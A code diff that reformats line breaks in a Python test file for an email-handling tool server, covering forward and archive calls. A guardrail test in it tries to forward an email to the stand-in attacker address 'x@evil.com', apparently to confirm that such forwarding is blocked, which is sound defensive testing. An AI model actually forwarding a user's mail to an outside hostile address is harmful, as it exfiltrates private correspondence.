@@ -37,7 +37,8 @@ class TestReadWriteFlow:
         # 3. forward
         fwd = tool_json(
             await server.call_tool(
-                "forward_email", {"email_id": email.message_id.value, "to": "dest@corp.com"}
+                "forward_email",
+                {"email_id": email.message_id.value, "to": "dest@corp.com"},
             )
         )
         assert "error" not in fwd
@@ -45,7 +46,9 @@ class TestReadWriteFlow:
 
         # 4. archive
         arch = tool_json(
-            await server.call_tool("archive_email", {"email_id": email.message_id.value})
+            await server.call_tool(
+                "archive_email", {"email_id": email.message_id.value}
+            )
         )
         assert arch == {"status": "archived"}
         assert ("m1", [], ["INBOX"]) in env.gateway.modify_calls
@@ -76,7 +79,8 @@ class TestRailguardEnforcement:
 
         result = tool_json(
             await server.call_tool(
-                "forward_email", {"email_id": email.message_id.value, "to": "x@evil.com"}
+                "forward_email",
+                {"email_id": email.message_id.value, "to": "x@evil.com"},
             )
         )
 
